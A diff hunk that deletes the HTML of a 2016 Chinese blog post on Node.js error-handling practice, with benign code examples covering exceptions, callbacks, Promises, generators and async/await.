@@ -273,844 +273,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/10/03/2016/2016-10-03-nodejs-error-handling/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="逐流小站">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016/10/03/2016/2016-10-03-nodejs-error-handling/" itemprop="url">Node.js 错误处理实践</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-03T00:00:00+08:00">
-                2016-10-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
-     crossorigin="anonymous"></script>
-<ins class="adsbygoogle"
-     style="display:block; text-align:center;"
-     data-ad-layout="in-article"
-     data-ad-format="fluid"
-     data-ad-client="ca-pub-4522670236044605"
-     data-ad-slot="5167312561"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-      
-      
-
-      
-        
-        
-          
-            <blockquote>
-<p>这篇文章由我九月末在 <a target="_blank" rel="noopener" href="https://github.com/Hangzhou-Node-Party/slides">Node Patry 杭州</a> 进行的一次技术分享整理而来。</p>
-</blockquote>
-<p>今天我想介绍的是 Node.js 开发中一个很小，但又很重要的话题 —— 错误处理。作为一名软件工程师，我想我们应该都会认可「错误是无法避免的」，因此我们必须积极地去对待这些错误，才能写出健壮的代码。</p>
-<p>首先，我想先介绍一下我们理想的错误处理是什么样的：</p>
-<ul>
-<li>出现错误时能将任务中断在一个合适的位置</li>
-<li>能记录错误的摘要、调用栈及其他上下文</li>
-<li>通过这些记录能够快速地发现和解决问题</li>
-</ul>
-<p>通常一个大的任务是由很多小的步骤构成的，很多时候当一个步骤中发生了错误，你并不能放任它在这里中断。我又要举那个经典的例子了：两个人，A 向 B 转账，当从 A 的账户扣完钱要加到 B 的账户上的时候发生了错误，这时显然你不能让整个任务中断在这里，否则就会出现数据的不一致 —— A 的账户被扣了钱但没有被加到其他任何账户上。因此我们需要通过错误处理精心地控制错误中断的位置，在必要的情况下回滚数据，确保数据的一致性。</p>
-<p>我们的程序也需要在出现错误的情况下能够显示（或记录）一个错误的摘要、调用栈，以及其他的上下文。调用栈通常语言本身会提供，但很多时候仅有调用栈是不足以定位问题的，所以我们还需要去记录那些可能与这个错误有关的「上下文」，比如当时某几个关键的变量的值。对于一个服务器端项目，如果我们决定不向用户展示错误的详情，可能还需要为用户提供一个唯一的错误编号，以便用户事后反馈的时候我们可以根据编号还原当时的现场。</p>
-<p>我也要举一些反面的例子，我们不希望错误处理是这样的：</p>
-<ul>
-<li>出现错误后程序崩溃退出</li>
-<li>出现错误后 HTTP 请求无响应</li>
-<li>出现错误后数据被修改了「一半」，出现不一致</li>
-<li>出现错误后没有记录日志或重复记录</li>
-<li>在日志中打印了错误但没有提供调用栈和上下文</li>
-</ul>
-<p>在 Node.js 程序中经常会出现 HTTP 请求无响应的情况 —— 既没有收到成功响应，也没有收到失败响应，一直在保持着连接。这通常是由于回调函数中的代码抛出了一个异常但没有被正确地捕捉，导致对这个请求的处理流程被意外地中断了，后面我们会介绍如何写出健壮的异步代码。</p>
-<p>有的数据库会提供回滚事务的功能，但有的时候我们在使用非事务的数据库，或者在操作临时文件或其他的外部资源，这时就需要我们自己在出现错误的时候来回滚数据了。</p>
-<p>出现错误有没有记录或记录不全也是一个非常糟糕的情况，这会让你无从定位错误，你不得不去排查代码的每一个路径，通过用日志打点的方式排查错误发生在哪里；或者虽然打印了错误但没有调用栈或上下文，这也会给你定位错误带来一些不便；再或者一旦一个错误发生了，整个程序里所有相关的函数调用都在打印这个错误，造成日志被错误刷屏，虽然不是大问题，但也会让人感到烦躁。</p>
-<h2 id="层次化架构"><a href="#层次化架构" class="headerlink" title="层次化架构"></a>层次化架构</h2><p>前辈们说过「计算机领域内的任何问题都可以通过添加一个抽象层的方法来解决」，当我们需要维护一个规模较大的项目时，通常会选择一种层次化的架构：</p>
-<p><img src="https://r2-lc-cn.jysperm.me/pictures/2016/layers.png"></p>
-<p>其实我们通常提到的 MVC 就算是一种层次化架构，但我在这里展示了一个更为通用的架构：左侧的 Dispatcher 指程序的入口点，对于 Web 后端来说可能是解析 HTTP 请求，分发到对应处理函数的部分；对于 GUI 程序来说可能是接受用户输入的部分；对于命令行程序来说可能是解析命令行参数的部分。</p>
-<p>在来自外部的任务被 Dispatcher 转换为内部表示之后，会进入到业务逻辑层，这部分是一个程序最复杂也是最核心的部分，它的内部可能还会被划分为若干个小的模块和层次。</p>
-<p>最后，我觉得无论是什么程序，最后都要去操作数据，这就是图中的 Date Access 层。对于服务器端程序来说可能会直接连接到一个数据库；对于客户端程序来说可能会使用一个 HTTP Client 去操作远程的数据。</p>
-<p>那么如果在这样一个复杂的层次化架构中，某个环节发生了错误怎么办？我们很可能会面临一个问题：<strong>我们在某一个层级可能没有足够的信息去决定如何处理这个错误</strong>。例如在 Data Access 层，一个数据库查询发生了错误，在 Data Access 这一层我们并不知道这个失败的查询对于更上层的业务逻辑意味着什么，而仅仅知道这个查询失败了。</p>
-<p>所以我们需要有一种机制，<strong>将错误从底层不断地向上层传递，直到错误到达某个层级有足够的信息去决定如何处理这个错误</strong>。例如一个数据库查询的失败，根据不同的业务逻辑，可能会采取忽略、重试、中断整个任务这些完全不同的处理方式。</p>
-<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>好在 JavaScript 为我们提供了异常（Exception）这样一个特性。异常是现代的高级语言所提供的一种非常强大的流程控制机制，我说它是流程控制机制，是说它和 if-else、for、while 其实是差不多的，都是用来进行流程控制的。异常让原本唯一的、正确的执行路径变得可以从任何一处中断，并进入一个所谓的「异常处理流程」。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="title function_">step1</span>();</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">stack</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">step1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="title function_">step2</span>()</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">step2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> ( ... )</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;some error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在前面的例子中，我们定义了 step1 和 step2 两个函数，step1 调用了 step2，而 step2 中有可能抛出一个异常。我们仅需将对 step1 的调用放在一个 try 的语句块里，便可在后面的 catch 块中捕捉到 step2 抛出的异常，而不需要在 step1 和 step2 中进行任何处理 —— 即使它们再调用了其他函数。</p>
-<p>这是因为异常会随着调用栈逆向地回溯，然后被第一个 catch 块捕捉到。这恰好符合我们前面提到的需求：在某个较底层（调用层次较深）的函数中我们没有足够的信息去处理这个错误，我们便不必在代码中特别地处理这个错误，因为异常会沿着调用栈回溯，直到某个层次有信息去处理这个异常，我们再去 catch, 一旦一个异常被 catch 了，便不会再继续回溯了（除非你再次 throw），这时我们称这个异常被处理了。</p>
-<blockquote>
-<p>P.S. 下文中我们会同时使用「错误」和「异常」这两个词，它们之间的差别比较微妙：错误通常用来表示广义的不正确、不符合预期的情况；异常则具体指 JavaScript 或其他很多语言中提供的一种流程控制机制，以及在这个机制中被传递的异常对象。</p>
-</blockquote>
-<p>也有很多语言是没有异常的支持的，例如 C 和 Golang, 让我们来想象一下没有异常的 JavaScript 会是什么样子：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> err = <span class="title function_">step1</span>();</span><br><span class="line"><span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">step1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">var</span> err = <span class="title function_">step2</span>();</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="string">&#x27;step1: &#x27;</span> + err;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">step2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> ( ... )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;step2: some error&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果没有异常，每个函数都必须提供一种方式，告诉它的调用者是否有错误发生，在这里我们选择通过返回值的方式来表示错误，即如果返回空代表执行成功，返回了非空值则表示发生了一个错误。可以看到在每一次函数调用时，我们都需要去检查返回值来确定是否发生了错误，如果有错误发生了，就要提前中断这个函数的执行，将同样的错误返回。如果 step1 或 step2 中再去调用其他的函数，也需要检查每个函数的返回值 —— 这是一项非常机械化的工作，即使我们不去处理错误也必须手动检查，并在有错误时提前结束。</p>
-<p>语言内建的异常还提供了另外一项非常有用的功能，那就是调用栈：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Error: some error</span><br><span class="line">    at step2 (~/exception.js:14:9)</span><br><span class="line">    at step1 (~/exception.js:9:3)</span><br><span class="line">    at &lt;anonymous&gt; (~/exception.js:2:3)</span><br></pre></td></tr></table></figure>
-
-<p>这是前面的例子中打印出的调用栈，调用栈中越靠上的部分越接近异常实际产生的位置，而下面的调用栈则会帮助我们的还原程序执行的路径。调用栈是 JavaScript 引擎为我们提供的功能，如果没有异常的话，恐怕就需要我们自己来维护调用栈了。</p>
-<h2 id="抛出一个异常"><a href="#抛出一个异常" class="headerlink" title="抛出一个异常"></a>抛出一个异常</h2><p>我在这里把异常粗略地分为两类：</p>
-<ul>
-<li>预期的异常：参数不合法、前提条件不满足</li>
-<li>非预期的异常：JavaScript 引擎的运行时异常</li>
-</ul>
-<p>预期的异常通常是我们在代码中主动抛出的，目的是为了向调用者报告一种错误，希望外部的逻辑能够感知到这个错误，在某些情况下也可能是希望外部的逻辑能够给用户展示一个错误提示。</p>
-<p>非预期的异常通常说明我们的程序有错误或者考虑不周到，比如语法错误、运行时的类型错误。或者也可能是来自依赖的库的错误，在实践中我们通常会把来自依赖库中的错误，捕捉后再次以特定的格式抛出，将其简单地「转化」为预期的异常。</p>
-<p>那么，如果我们要主动抛出一个异常，应该怎样做呢：</p>
-<ul>
-<li>总是抛出一个继承自 Error 的对象</li>
-<li>慎用自定义的异常类型</li>
-<li>可以直接向异常上附加属性来提供上下文</li>
-</ul>
-<p>首先你应该总是抛出一个继承自 JavaScript 内建的 Error 类型的对象，而不要抛出 String 或普通的 Object, 因为只有语言内建的 Error 对象上才会有调用栈，抛出其他类型的对象将可能会导致调用栈无法正确地被记录。同时也要慎重地使用自定义的异常类型，因为目前 JavaScript 中和调用栈有关的 API（如 <code>Error.captureStackTrace</code>）还不在标准中，各个引擎的实现也不同，你很难写出一个在所有引擎都可用的自定义异常类型。因此如果你的代码可能会同时运行在 Node.js 和浏览器中，或者你在编写一个开源项目，那么建议你不要使用自定义的异常类型；如果你的代码不是开源的，运行环境也非常确定，则可以考虑使用引擎提供的私有 API 来自定义异常类型。</p>
-<p>另外这里的建议不仅适用于传递给 throw 关键字的异常对象，也适用于传递给 callback 函数的第一个参数。</p>
-<p>前面我们几次提到「上下文」的这个概念，所谓上下文就是说和这个错误有关的一些信息，这个「有关」可能是非常主观的，即你觉得那些有助于你定位错误的信息。借助于 JavaScript 灵活的类型机制，我们可以向任意对象上附加任意的属性，异常对象也不例外：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> err = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Permission denied&#x27;</span>);</span><br><span class="line">err.<span class="property">statusCode</span> = <span class="number">403</span>;</span><br><span class="line"><span class="keyword">throw</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> err = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Error while downloading&#x27;</span>);</span><br><span class="line">err.<span class="property">url</span> = url;</span><br><span class="line">err.<span class="property">responseCode</span> = res.<span class="property">statusCode</span>;</span><br><span class="line"><span class="keyword">throw</span> err;</span><br></pre></td></tr></table></figure>
-
-<p>前面一个例子中，当一个请求无权限访问数据时，我们在抛出的异常对象上添加了一个 <code>statusCode = 403</code> 的属性，这个属性将会提示最终处理这个错误的 HTTP 层代码，给客户端发送 409 的错误响应；后面一个例子是在下载一个文件时发生了错误，当出现了这样的情况，显然我们最感兴趣的会是下载的地址是什么、服务器发回了怎样的响应，所以我们选择将这两个信息附加到异常对象上，供外层的逻辑读取。</p>
-<h2 id="异步任务"><a href="#异步任务" class="headerlink" title="异步任务"></a>异步任务</h2><p>目前为止我们提到的都是 JavaScript 语言内建的异常特性，但因为语言内建的异常是基于调用栈的，所以它只能在「同步」的代码中使用。当我们刚刚入门 Node.js 时经常会搞不清这一点：「异步」任务是通过所谓的「事件队列」来实现的，每当引擎从事件队列中取出一个回调函数来执行时，实际上这个函数是在调用栈的最顶层执行的，如果它抛出了一个异常，也是无法沿着调用栈回溯到这个异步任务的创建者的。</p>
-<p>所以你无法在异步代码中直接使用 try … catch 来捕捉异常，因此接下来我们会介绍如何在异步的代码中使用类似异常的机制来处理错误，在这里我粗略地将 Node.js 中常见的异步流程控制机制分为下面三大类：</p>
-<ul>
-<li>Node.js style callback</li>
-<li>Promise（co、async&#x2F;await）</li>
-<li>EventEmitter（Stream）</li>
-</ul>
-<p>首先是影响了几乎所有 Node.js 程序员的 Node.js style callback:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyFileContent</span>(<span class="params"><span class="keyword">from</span>, to, callback</span>) &#123;</span><br><span class="line">  fs.<span class="title function_">readFile</span>(<span class="keyword">from</span>, <span class="function">(<span class="params">err, buffer</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="title function_">callback</span>(err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        fs.<span class="title function_">writeFile</span>(to, buffer, callback);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="title function_">callback</span>(err);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="title function_">copyFileContent</span>(<span class="keyword">from</span>, to, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们在这里以一个 copyFileContent 函数为例，它从第一个参数所代表的源文件中读取内容，然后写入到第二个参数所代表的目标文件。</p>
-<p>首先需要注意的是在每次回调中，我们都需要去检查 err 的值，如果发现 err 有值就代表发生了错误，那么需要提前结束，并以同样的错误调用 callback 来将错误传递给调用者。</p>
-<p>然后在回调中的代码也必须要包裹在 try … catch 中来捕捉同步的异常，如果捕捉到了同步的异常，那么也需要通过 callback 将错误传递给调用者。这里是一个比较大的坑，很多人会忘记，但按照 Node.js style callback 的风格，一个函数既有可能同步地抛出一个异常，也有可能异步地通过 callback 报告一个错误，Node.js 标准库中的很多函数也是如此。</p>
-<p>在使用这个 copyFileContent 时，我们也需要同时去捕捉同步抛出的异常和异步返回的错误，实际上这样导致了错误情况下的逻辑分散到了两处，实在让人有些难以接受。</p>
-<p>我们来总结一下使用 Node.js style callback 时琐碎的细节：</p>
-<ul>
-<li>需要同时处理同步的异常和异步的回调</li>
-<li>在每次回调中需要检查 err 的值</li>
-<li>回调中的代码也需要捕捉同步异常</li>
-</ul>
-<p>最后确保：无论成功或失败，要么 callback 被调用，要么同步地抛出一个异常。</p>
-<p>我们需要在每个回调中检查 err 的值，如果有值就立刻调用 callback 并不再执行接下来的逻辑，确保错误被传递给调用者。仔细想想，这个做法和我们一开始展示的「没有异常的 JavaScript」是多么地相似！我们必须手动地去完成错误的传递工作，而且中间有很多容易被遗漏的琐碎细节。这也是为什么后来 Promise 得到了大家的认可，逐步取代了 Node.js style callback.</p>
-<p>那么为什么 Node.js 会选择 callback style 而不是 Promise 作为标准库的接口呢？很大程度上是因为在 Node.js 刚刚发布时，Promise 还未进入 ECMAScript 的标准，Node.js 认为标准库应该提供最简单、最基本的接口，而使用 Promise 意味着 Node.js 还需要在标准库中内建一个 Promise 的实现，引入了额外的复杂度。如果用户希望使用 Promise 风格的标准库，大可以自己封装一个或选择第三方的封装，而标准库本身依然提供着最「简单」的接口。</p>
-<p>所以接下来我们来看 Promise:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyFileContent</span>(<span class="params"><span class="keyword">from</span>, to</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> fs.<span class="title function_">readFile</span>(<span class="keyword">from</span>).<span class="title function_">then</span>( <span class="function">(<span class="params">buffer</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fs.<span class="title function_">writeFile</span>(to, buffer);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">try</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">copyFileContent</span>(<span class="keyword">from</span>, to);</span><br><span class="line">&#125;).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>Promise 可以说是对同步任务和异步任务的一种一致的抽象，算是 Node.js 中异步流程控制的未来趋势，今天我们不过多介绍 Promise, 而是着重来看它对于错误处理的影响。</p>
-<p>Pormise 的版本相比于前面的 Node.js style callback 要短了许多，主要是我们不需要在 copyFileContent 中处理错误了，而只需要去考虑正常的流程。<code>fs.readFile</code>、<code>fs.writeFile</code> 和 copyFileContent 的返回值都是一个 Promise, 它会帮助我们传递错误，在 Promise 上调用 <code>.then</code> 相当于绑定一个成功分支的回调函数，而 <code>.catch</code> 相当于绑定一个失败分支的错误处理函数，实际上我们的代码已经非常类似于语言内建的异常机制了。</p>
-<p>我也要介绍一些在使用 Promise 过程中的最佳实践，首先是要尽量避免手动创建 Promise:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyFileContent</span>(<span class="params"><span class="keyword">from</span>, to</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>( <span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="keyword">from</span>, <span class="function">(<span class="params">err, buffer</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="title function_">reject</span>(err);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          fs.<span class="title function_">writeFile</span>(to, buffer, resolve);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">          <span class="title function_">reject</span>(err);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Promise 也有一个构造函数，通常用于将一段 Node.js style callback 风格的逻辑封装为 Promise, 在其中你需要手动在成功或失败的情况下调用 resolve 或 reject, 也需要手动处理 Node.js style callback 中各种琐碎的细节，十分容易出现疏漏。</p>
-<p>取而代之的是，我们应该使用类似于 bluebird 提供的 <code>Promise.promisify</code> 这样的函数自动地帮我们完成转换，<code>Promise.promisify</code> 接受一个 Node.js style callback 风格的函数然后帮助我们自动转换到返回 Promise 的函数，虽然其内部和我们前面手动转换的例子差不多，但使用它可以避免直接面对复杂的转换逻辑，减少犯错的可能性：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyFileContent</span>(<span class="params"><span class="keyword">from</span>, to</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">promisify</span>(fs.<span class="property">readFile</span>)(<span class="keyword">from</span>).<span class="title function_">then</span>( <span class="function">(<span class="params">buffer</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">promisify</span>(fs.<span class="property">writeFile</span>)(to, buffer);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>至于 co&#x2F;generator 和 async&#x2F;await，我觉得它们和 Promise 并没有什么本质上的区别，而且它们最后也提供了和 Promise 相兼容的 API, 因此接下来我们只是简单地一笔带过。</p>
-<p>generator 提供了一种中断函数的执行而后再继续的能力，这种能力让它可以被用作异步流程控制：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> copyFileContent = co.<span class="title function_">wrap</span>(<span class="keyword">function</span>*(<span class="keyword">from</span>, to) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">yield</span> fs.<span class="title function_">writeFile</span>(to, <span class="keyword">yield</span> fs.<span class="title function_">readFile</span>(<span class="keyword">from</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">co</span>(<span class="keyword">function</span>*() &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">yield</span> <span class="title function_">copyFileContent</span>(<span class="keyword">from</span>, to));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>而 async&#x2F;await 则是基于 generator 的进一步优化，使代码更加简洁而且具有语义：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">copyFileContent</span>(<span class="params"><span class="keyword">from</span>, to</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">await</span> fs.<span class="title function_">writeFile</span>(to, <span class="keyword">await</span> fs.<span class="title function_">readFile</span>(<span class="keyword">from</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">await</span> <span class="title function_">copyFileContent</span>(<span class="keyword">from</span>, to));</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通常来说一个返回 Promise 的函数也有可能同步地抛出一个异常，这也是为什么前面的代码我用了一个 <code>Promise.try</code>，如果你的代码已经在一个 Promise 的 <code>.then</code> 里，那你就不必去加 <code>Promise.try</code> 了，甚至也不需要为每一个 Promise 添加 <code>.catch</code>，而是让它自动地向上层抛出，这和 Node.js style callback 有着本质的区别，下面我们来展示一个更复杂一些的例子：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">try</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">copyFileContent</span>(a, b);</span><br><span class="line">&#125;).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">copyFileContent</span>(b, c);</span><br><span class="line">&#125;).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">copyFileContent</span>(c, d);</span><br><span class="line">&#125;).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title 